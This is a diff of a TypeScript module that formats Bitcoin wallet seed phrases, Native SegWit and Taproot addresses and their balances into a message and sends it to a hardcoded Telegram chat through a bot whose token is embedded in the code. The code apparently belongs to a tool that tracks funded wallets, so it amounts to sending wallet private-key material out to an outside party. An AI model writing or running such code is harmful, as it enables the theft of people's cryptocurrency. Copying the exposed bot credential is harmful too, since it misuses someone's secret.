@@ -1,26 +1,28 @@
 import TelegramBot from "node-telegram-bot-api";
+import { WalletConCashItem } from "../leer/leerSeguimientoWalletCash";
 
 const token = "7943951367:AAG0X-lhN4kkIaR0oLV-63ZWwgwfgqisTOs";
 const bot = new TelegramBot(token, { polling: false });
 const chatId = "814041563";
 
-export const enviarMensajeTelegram = (
-    frase: string,
-    wallet: string,
-    saldoActual: string,
-    saldoRecibido: string,
-    saldoSinConfirmar: string
-  ): void => {
+export const enviarMensajeTelegram = (msj: WalletConCashItem): void => {
     const mensaje = `   📢 Semilla: 
-                        ${frase}
+                        ${msj.frase}
                         ---------------
-                        👛 Wallet: 
-                        ${wallet}
+                        👛 Wallet_NativeSegWit: 
+                        ${msj.direccion_NativeSegWit}
                         ---------------
-                        💰 Saldo actual: ${saldoActual}
-                        📥 Saldo recibido: ${saldoRecibido}
-                        ⏳ Saldo sin confirmar: ${saldoSinConfirmar}`;
-  
+                        👛 Wallet_Taproot: 
+                        ${msj.direccion_Taproot}
+                        ---------------
+                        💰 Saldo actual_NativeSegWit: ${msj.saldoActual_NativeSegWit}
+                        📥 Saldo recibido: ${msj.saldoRecibido_NativeSegWit}
+                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_NativeSegWit}
+                        ---------------
+                        💰 Saldo actual_Taproot: ${msj.saldoActual_Taproot}
+                        📥 Saldo recibido: ${msj.saldoRecibido_Taproot}
+                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_Taproot}
+                        `;
     bot
       .sendMessage(chatId, mensaje)
       .then(() => {
